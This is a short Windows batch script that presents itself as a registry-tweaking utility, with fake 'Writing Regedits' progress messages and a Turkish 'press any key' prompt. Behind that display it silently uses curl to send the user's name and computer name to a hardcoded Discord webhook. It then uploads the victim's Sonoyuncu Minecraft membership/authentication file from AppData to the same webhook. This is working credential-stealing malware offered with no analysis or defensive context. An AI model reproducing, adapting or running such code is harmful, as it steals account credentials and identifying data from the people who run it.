@echo off

set authkey-web= https://discord.com/api/webhooks/1190715735954174124/S_evtXpTwsu4uOk343gXxTlj44XFZRWDYHQrwVRSQRC12sOMl6ViL_BjFpofouuId2Hy
color b
title zyn0n

Echo Writing Regedits ...
Echo Writing Regedits ...
Echo Writing Regedits ...
Echo Writing Regedits ...
Echo Istediginiz Bir Tusa Basiniz !
pause > nul
Echo Succes ... 

set message=:warning: **%username%  Pc UserName ** :warning:\n\n:man_pouting: **Computer Name** : %ComputerName%\n:detective: **BOOMM **
curl --silent --output /dev/null -X POST -H "Content-type: application/json" --data "{\"content\": \"%message%\"}" %authkey-web%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \":green_square: **Sonoyuncu**\"}"  %authkey-web%
curl --silent --output /dev/null -F minecraftauth=@"%appdata%\.sonoyuncu\sonoyuncu-membership.json" %authkey-web%



pause > nul